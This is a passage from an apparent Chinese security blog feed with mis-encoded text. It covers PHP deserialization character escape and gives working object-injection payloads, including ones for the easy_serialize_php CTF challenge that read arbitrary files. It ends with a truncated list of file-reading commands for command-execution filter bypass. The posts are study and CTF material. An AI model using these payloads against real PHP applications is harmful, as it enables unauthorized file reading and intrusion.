class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($f)</span></span>&#123;</span><br><span class="line">    $filter = <span class="string">'/c/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$f);</span><br><span class="line">&#125;</span><br><span class="line">$account = [];</span><br><span class="line">$account[<span class="string">'u'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">$account[<span class="string">'p'</span>] = <span class="string">'pass'</span>; </span><br><span class="line">extract($_GET);</span><br><span class="line">$account[<span class="string">'g'</span>] = <span class="string">'g7bk'</span>;</span><br><span class="line">var_dump(serialize($account));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$r = filter(serialize($account));</span><br><span class="line">var_dump($r);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">var_dump(unserialize($r));</span><br></pre></td></tr></table></figure><p>å…ˆç»™å‡ºpayloadï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?account[u]=cccccccccccccccccccccccccccccccccccccccc&amp;account[p]=";s:1:"m";s:9:"xianyu123";s:1:"h";s:4:"hhhh";s:1:"g";s:4:"kkkk";&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬å…ˆä¸è¦çœ‹è¿‡æ»¤çš„ä»£ç </p><p>æ­£å¸¸æƒ…å†µä¸‹çš„åºåˆ—åŒ–ç»“æœä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">"u"</span>;s:<span class="number">40</span>:<span class="string">"cccccccccccccccccccccccccccccccccccccccc"</span>;s:<span class="number">1</span>:<span class="string">"p"</span>;s:<span class="number">65</span>:<span class="string">""</span>;s:<span class="number">1</span>:<span class="string">"m"</span>;s:<span class="number">9</span>:<span class="string">"xianyu123"</span>;s:<span class="number">1</span>:<span class="string">"h"</span>;s:<span class="number">4</span>:<span class="string">"hhhh"</span>;s:<span class="number">1</span>:<span class="string">"g"</span>;s:<span class="number">4</span>:<span class="string">"kkkk"</span>;&#125;<span class="string">";s:1:"</span>g<span class="string">";s:4:"</span>g7bk<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>ç»è¿‡è¿‡æ»¤å‡½æ•°åçš„åºåˆ—åŒ–ç»“æœä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">"u"</span>;s:<span class="number">40</span>:<span class="string">""</span>;s:<span class="number">1</span>:<span class="string">"p"</span>;s:<span class="number">65</span>:<span class="string">""</span>;s:<span class="number">1</span>:<span class="string">"m"</span>;s:<span class="number">9</span>:<span class="string">"xianyu123"</span>;s:<span class="number">1</span>:<span class="string">"h"</span>;s:<span class="number">4</span>:<span class="string">"hhhh"</span>;s:<span class="number">1</span>:<span class="string">"g"</span>;s:<span class="number">4</span>:<span class="string">"kkkk"</span>;&#125;<span class="string">";s:1:"</span>g<span class="string">";s:4:"</span>g7bk<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>u</code>çš„é•¿åº¦è™½ç„¶ä¸º40ï¼Œä½†æ˜¯å·²ç»æ²¡æœ‰äº†å†…å®¹ï¼Œæ‰€ä»¥ååºåˆ—åŒ–ä¼šè‡ªåŠ¨å¾€åè¯»å–40ä½</p><p><img src="http://images.xianyu123.club/php_serialize_escape6.png" alt></p><p>ä¼šè¯»å–åˆ°ä¸Šå›¾çš„ä½ç½®ï¼Œç„¶åç»“æŸã€‚å› ä¸º<code>u</code>çš„åºåˆ—åŒ–å†…å®¹è¯»å–æ•°æ®æ—¶éœ€è¦å¾€åå¡«å……40ä½ï¼Œå¯¼è‡´åé¢çš„<code>p</code>çš„å†…å®¹ä¹Ÿå‘ç”Ÿäº†æ”¹å˜ï¼Œåæ‰äº†å…¶åŒå¼•å·ï¼Œæ‰€ä»¥æ­¤æ—¶åé¢çš„<code>&quot;;s:1:&quot;g&quot;;s:4:&quot;g7bk&quot;;}</code>åœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šè¢«å½“ä½œéæ³•å­—ç¬¦å¿½ç•¥æ‰ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>$account[&#39;g&#39;]</code>çš„å€¼ã€‚</p><p><img src="http://images.xianyu123.club/php_serialize_escape5.png" alt></p><h1 id="å®é™…ä¸­çš„æ¡ˆä¾‹åˆ†æ"><a href="#å®é™…ä¸­çš„æ¡ˆä¾‹åˆ†æ" class="headerlink" title="å®é™…ä¸­çš„æ¡ˆä¾‹åˆ†æ"></a>å®é™…ä¸­çš„æ¡ˆä¾‹åˆ†æ</h1><p>joomla3.0.0-3.4.6 å¯¹è±¡æ³¨å…¥å¯¼è‡´çš„ååºåˆ—åŒ–</p><h1 id="CTFä¸­çš„åˆ©ç”¨"><a href="#CTFä¸­çš„åˆ©ç”¨" class="headerlink" title="CTFä¸­çš„åˆ©ç”¨"></a>CTFä¸­çš„åˆ©ç”¨</h1><p>å®‰æ´µæ¯2019-easy_serialize_php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹æ³•å’Œä¸Šé¢çš„demo2ç±»ä¼¼ï¼Œè¿™é‡Œå°±ä¸å†é‡å¤äº†ï¼ŒåŸç†å°±æ˜¯åˆ©ç”¨è¿‡æ»¤ä¸ºç©ºè®©ååºåˆ—åŒ–ä¼šè‡ªåŠ¨å¾€åè¯»å–ï¼Œç„¶åå¯ä»¥å¯¹<code>$_SESSION[&#39;img&#39;]</code>è¿›è¡Œæ§åˆ¶ï¼Œè¿›è€Œå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–</p><p>payloadï¼š</p><p>è¯»å–hintæç¤º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=fl1gfl1gfl1gfl1gfl1gfl1g&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="number">3</span>:<span class="string">"aaa"</span>;s:<span class="number">2</span>:<span class="string">"no"</span>;&#125;&amp;<span class="function"><span class="keyword">function</span>=<span class="title">show_image</span></span></span><br></pre></td></tr></table></figure><p>è¯»å–flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=fl1gfl1gfl1gfl1gfl1gfl1g&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"L2QwZzNfZmxsbGxsbGFn"</span>;s:<span class="number">3</span>:<span class="string">"aaa"</span>;s:<span class="number">2</span>:<span class="string">"no"</span>;&#125;&amp;<span class="function"><span class="keyword">function</span>=<span class="title">show_image</span></span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://www.cnblogs.com/wfzWebSecuity/p/11876441.html" target="_blank" rel="noopener">PHPå­—ç¬¦é€ƒé€¸å¯¼è‡´çš„å¯¹è±¡æ³¨å…¥</a></li><li><a href="https://www.cnblogs.com/peri0d/p/11845917.html" target="_blank" rel="noopener">è¯¦è§£PHPååºåˆ—åŒ–ä¸­çš„å­—ç¬¦é€ƒé€¸</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;phpååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸çš„å­¦ä¹ &lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>phpä¸­escapeshellargå’Œescapeshellcmdçš„ç»•è¿‡</title>
    <link href="http://0clickjacking0.github.io/2019/12/13/php%E4%B8%ADescapeshellarg%E5%92%8Cescapeshellcmd%E7%9A%84%E7%BB%95%E8%BF%87/"/>
    <id>http://0clickjacking0.github.io/2019/12/13/phpä¸­escapeshellargå’Œescapeshellcmdçš„ç»•è¿‡/</id>
    <published>2019-12-13T12:03:44.000Z</published>
    <updated>2019-12-13T13:04:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>phpä¸­escapeshellargå’Œescapeshellcmdçš„ç»•è¿‡çš„å­¦ä¹ </p><a id="more"></a><h1 id="çŸ¥è¯†é“ºå«"><a href="#çŸ¥è¯†é“ºå«" class="headerlink" title="çŸ¥è¯†é“ºå«"></a>çŸ¥è¯†é“ºå«</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;phpä¸­escapeshellargå’Œescapeshellcmdçš„ç»•è¿‡çš„å­¦ä¹ &lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œbypassçš„æ€»ç»“</title>
    <link href="http://0clickjacking0.github.io/2019/12/11/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass%E7%9A%84%E6%80%BB%E7%BB%93/"/>
    <id>http://0clickjacking0.github.io/2019/12/11/å‘½ä»¤æ‰§è¡Œbypassçš„æ€»ç»“/</id>
    <published>2019-12-11T02:17:37.000Z</published>
    <updated>2020-01-12T11:24:08.436Z</updated>
    
    <content type="html"><![CDATA[<p>å‘½ä»¤æ‰§è¡Œbypassçš„æ€»ç»“</p><a id="more"></a><h1 id="å…³äºæ–‡ä»¶è¯»å–çš„å‘½ä»¤"><a href="#å…³äºæ–‡ä»¶è¯»å–çš„å‘½ä»¤" class="headerlink" title="å…³äºæ–‡ä»¶è¯»å–çš„å‘½ä»¤"></a>å…³äºæ–‡ä»¶è¯»å–çš„å‘½ä»¤</h1><h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p><strong>catå‘½ä»¤</strong>è¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Šï¼Œcatç»å¸¸ç”¨æ¥æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cat 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h2><p><strong>tacå‘½ä»¤</strong>ç”¨äºå°†æ–‡ä»¶å·²è¡Œä¸ºå•ä½çš„ååºè¾“å‡ºï¼Œå³ç¬¬ä¸€è¡Œæœ€åæ˜¾ç¤ºï¼Œæœ€åä¸€è¡Œå…ˆæ˜¾ç¤ºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># tac 1.txt</span></span><br><span class="line">666</span><br><span class="line">555</span><br><span class="line">123456</span><br></pre></td></tr></table></figure><h2 id="head"><a href="#head" class="headerlink" title="head"></a>head</h2><p><strong>headå‘½ä»¤</strong>ç”¨äºæ˜¾ç¤ºæ–‡ä»¶çš„å¼€å¤´çš„å†…å®¹ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œheadå‘½ä»¤æ˜¾ç¤ºæ–‡ä»¶çš„å¤´10è¡Œå†…å®¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># head 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h2><p><strong>tailå‘½ä»¤</strong>ç”¨äºè¾“å…¥æ–‡ä»¶ä¸­çš„å°¾éƒ¨å†…å®¹ã€‚tailå‘½ä»¤é»˜è®¤åœ¨å±å¹•ä¸Šæ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„æœ«å°¾10è¡Œã€‚å¦‚æœç»™å®šçš„æ–‡ä»¶ä¸æ­¢ä¸€ä¸ªï¼Œåˆ™åœ¨æ˜¾ç¤ºçš„æ¯ä¸ªæ–‡ä»¶å‰é¢åŠ ä¸€ä¸ªæ–‡ä»¶åæ ‡é¢˜ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šæ–‡ä»¶æˆ–è€…æ–‡ä»¶åä¸ºâ€œ-â€ï¼Œåˆ™è¯»å–æ ‡å‡†è¾“å…¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># tail 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@c6017a98836f:/var<span class="comment"># tail 1.txt 2.txt</span></span><br><span class="line">==&gt; 1.txt &lt;==</span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br><span class="line"></span><br><span class="line">==&gt; 2.txt &lt;==</span><br><span class="line">aaa</span><br><span class="line">bbb</span><br></pre></td></tr></table></figure><h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p><strong>moreå‘½ä»¤</strong>æ˜¯ä¸€ä¸ªåŸºäºviç¼–è¾‘å™¨æ–‡æœ¬è¿‡æ»¤å™¨ï¼Œå®ƒä»¥å…¨å±å¹•çš„æ–¹å¼æŒ‰é¡µæ˜¾ç¤ºæ–‡æœ¬æ–‡ä»¶çš„å†…å®¹ï¼Œæ”¯æŒviä¸­çš„å…³é”®å­—å®šä½æ“ä½œã€‚moreåå•ä¸­å†…ç½®äº†è‹¥å¹²å¿«æ·é”®ï¼Œå¸¸ç”¨çš„æœ‰Hï¼ˆè·å¾—å¸®åŠ©ä¿¡æ¯ï¼‰ï¼ŒEnterï¼ˆå‘ä¸‹ç¿»æ»šä¸€è¡Œï¼‰ï¼Œç©ºæ ¼ï¼ˆå‘ä¸‹æ»šåŠ¨ä¸€å±ï¼‰ï¼ŒQï¼ˆé€€å‡ºå‘½ä»¤ï¼‰ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># more 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="less-åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤"><a href="#less-åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤" class="headerlink" title="less(åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤)"></a>less(åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤)</h2><p><strong>lesså‘½ä»¤</strong>çš„ä½œç”¨ä¸<a href="http://man.linuxde.net/more" target="_blank" rel="noopener">more</a>ååˆ†ç›¸ä¼¼ï¼Œéƒ½å¯ä»¥ç”¨æ¥æµè§ˆæ–‡å­—æ¡£æ¡ˆçš„å†…å®¹ï¼Œä¸åŒçš„æ˜¯lesså‘½ä»¤å…è®¸ç”¨æˆ·å‘å‰æˆ–å‘åæµè§ˆæ–‡ä»¶ï¼Œè€Œmoreå‘½ä»¤åªèƒ½å‘å‰æµè§ˆã€‚ç”¨lesså‘½ä»¤æ˜¾ç¤ºæ–‡ä»¶æ—¶ï¼Œç”¨PageUpé”®å‘ä¸Šç¿»é¡µï¼Œç”¨PageDowné”®å‘ä¸‹ç¿»é¡µã€‚è¦é€€å‡ºlessç¨‹åºï¼Œåº”æŒ‰Qé”®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">less 1.txt</span><br><span class="line"></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h2><p><strong>nlå‘½ä»¤</strong>è¯»å– <a href="http://man.linuxde.net/file" target="_blank" rel="noopener">file</a> å‚æ•°ï¼ˆç¼ºçœæƒ…å†µä¸‹æ ‡å‡†è¾“å…¥ï¼‰ï¼Œè®¡ç®—è¾“å…¥ä¸­çš„è¡Œå·ï¼Œå°†è®¡ç®—è¿‡çš„è¡Œå·å†™å…¥æ ‡å‡†è¾“å‡ºã€‚åœ¨è¾“å‡ºä¸­ï¼Œnlå‘½ä»¤æ ¹æ®æ‚¨åœ¨å‘½ä»¤è¡Œä¸­æŒ‡å®šçš„æ ‡å¿—æ¥è®¡ç®—å·¦è¾¹çš„è¡Œã€‚è¾“å…¥æ–‡æœ¬å¿…é¡»å†™åœ¨é€»è¾‘é¡µä¸­ã€‚æ¯ä¸ªé€»è¾‘é¡µæœ‰å¤´ã€ä¸»ä½“å’Œé¡µè„šèŠ‚ï¼ˆå¯ä»¥æœ‰ç©ºèŠ‚ï¼‰ã€‚é™¤éä½¿ç”¨<code>-p</code>é€‰é¡¹ï¼Œnl å‘½ä»¤åœ¨æ¯ä¸ªé€»è¾‘é¡µå¼€å§‹çš„åœ°æ–¹é‡æ–°è®¾ç½®è¡Œå·ã€‚å¯ä»¥å•ç‹¬ä¸ºå¤´ã€ä¸»ä½“å’Œé¡µè„šèŠ‚è®¾ç½®è¡Œè®¡ç®—æ ‡å¿—ï¼ˆä¾‹å¦‚ï¼Œå¤´å’Œé¡µè„šè¡Œå¯ä»¥è¢«è®¡ç®—ç„¶è€Œæ–‡æœ¬è¡Œä¸èƒ½ï¼‰ã€‚å…¶é»˜è®¤çš„ç»“æœä¸<code>cat -n</code>æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œ nl å¯ä»¥å°†è¡Œå·åšæ¯”è¾ƒå¤šçš„æ˜¾ç¤ºè®¾è®¡ï¼ŒåŒ…æ‹¬ä½æ•°ä¸æ˜¯å¦è‡ªåŠ¨è¡¥é½0ç­‰ç­‰çš„åŠŸèƒ½ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># nl 1.txt</span></span><br><span class="line">     1123456</span><br><span class="line">     2555</span><br><span class="line">     3666</span><br></pre></td></tr></table></figure><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>ä»æŒ‡å®šçš„æ–‡ä»¶fileä¸­è¯»å–æ•°æ®ï¼Œç¼–ç ä¸ºbase64å­—ç¬¦ä¸²è¾“å‡ºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># base64 1.txt</span></span><br><span class="line">MTIzNDU2CjU1NQo2NjYK</span><br></pre></td></tr></table></figure><h2 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h2><p>ä»æŒ‡å®šçš„æ–‡ä»¶fileä¸­è¯»å–æ•°æ®ï¼Œç¼–ç ä¸ºbase32å­—ç¬¦ä¸²è¾“å‡ºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># base32 1.txt</span></span><br><span class="line">GEZDGNBVGYFDKNJVBI3DMNQK</span><br></pre></td></tr></table></figure><h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p><strong>stringså‘½ä»¤</strong>åœ¨å¯¹è±¡æ–‡ä»¶æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾å¯æ‰“å°çš„å­—ç¬¦ä¸²ã€‚å­—ç¬¦ä¸²æ˜¯4ä¸ªæˆ–æ›´å¤šå¯æ‰“å°å­—ç¬¦çš„ä»»æ„åºåˆ—ï¼Œä»¥æ¢è¡Œç¬¦æˆ–ç©ºå­—ç¬¦ç»“æŸã€‚ stringså‘½ä»¤å¯¹è¯†åˆ«éšæœºå¯¹è±¡æ–‡ä»¶å¾ˆæœ‰ç”¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># strings 1.txt</span></span><br><span class="line">123456</span><br></pre></td></tr></table></figure><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p><strong>sortå‘½ä»¤</strong>æ˜¯åœ¨Linuxé‡Œéå¸¸æœ‰ç”¨ï¼Œå®ƒå°†æ–‡ä»¶è¿›è¡Œæ’åºï¼Œå¹¶å°†æ’åºç»“æœæ ‡å‡†è¾“å‡ºã€‚sortå‘½ä»¤æ—¢å¯ä»¥ä»ç‰¹å®šçš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä»stdinä¸­è·å–è¾“å…¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@9423a7551563:/<span class="comment"># sort 1.txt</span></span><br><span class="line">123</span><br><span class="line">456</span><br></pre></td></tr></table></figure><h2 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h2><p>æ¯è¡Œéƒ½å€’åºè¾“å‡º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ rev 1.php</span><br><span class="line">.atad fo setyb )48(65 )1.0.0.721( 1.0.0.721 GNIP</span><br><span class="line">sm 340.0=emit 46=ltt 1=qes_pmci :1.0.0.721 morf setyb 46</span><br><span class="line">sm 140.0=emit 46=ltt 2=qes_pmci :1.0.0.721 morf setyb 46</span><br></pre></td></tr></table></figure><h2 id="od"><a href="#od" class="headerlink" title="od"></a>od</h2><p><strong>odå‘½ä»¤</strong>ç”¨äºè¾“å‡ºæ–‡ä»¶çš„å…«è¿›åˆ¶ã€åå…­è¿›åˆ¶æˆ–å…¶å®ƒæ ¼å¼ç¼–ç çš„å­—èŠ‚ï¼Œé€šå¸¸ç”¨äºæ˜¾ç¤ºæˆ–æŸ¥çœ‹æ–‡ä»¶ä¸­ä¸èƒ½ç›´æ¥æ˜¾ç¤ºåœ¨ç»ˆç«¯çš„å­—ç¬¦ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># od 1.txt</span></span><br><span class="line">0000000 031061 032063 033065 032412 032465 033012 033066 000012</span><br><span class="line">0000017</span><br></pre></td></tr></table></figure><h2 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h2><p><strong>cutå‘½ä»¤</strong>ç”¨æ¥æ˜¾ç¤ºè¡Œä¸­çš„æŒ‡å®šéƒ¨åˆ†ï¼Œåˆ é™¤æ–‡ä»¶ä¸­æŒ‡å®šå­—æ®µã€‚cutç»å¸¸ç”¨æ¥æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ï¼Œç±»ä¼¼äºä¸‹çš„<a href="http://man.linuxde.net/type" target="_blank" rel="noopener">type</a>å‘½ä»¤ã€‚</p><h3 id="cuté€‰é¡¹è¯´æ˜ï¼š"><a href="#cuté€‰é¡¹è¯´æ˜ï¼š" class="headerlink" title="cuté€‰é¡¹è¯´æ˜ï¼š"></a>cuté€‰é¡¹è¯´æ˜ï¼š</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">é€‰é¡¹-bï¼Œä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œåˆ†å‰²ï¼Œ-bæ”¯æŒå½¢å¦‚3-5çš„å†™æ³•ï¼Œè€Œä¸”å¤šä¸ªå®šä½ä¹‹é—´ç”¨é€—å·éš”å¼€å°±æˆäº†,æ¯”å¦‚æƒ³æå–ç¬¬3ï¼Œç¬¬4ã€ç¬¬5å’Œç¬¬8ä¸ªå­—èŠ‚ï¼Œå‘½ä»¤ä¸º -b 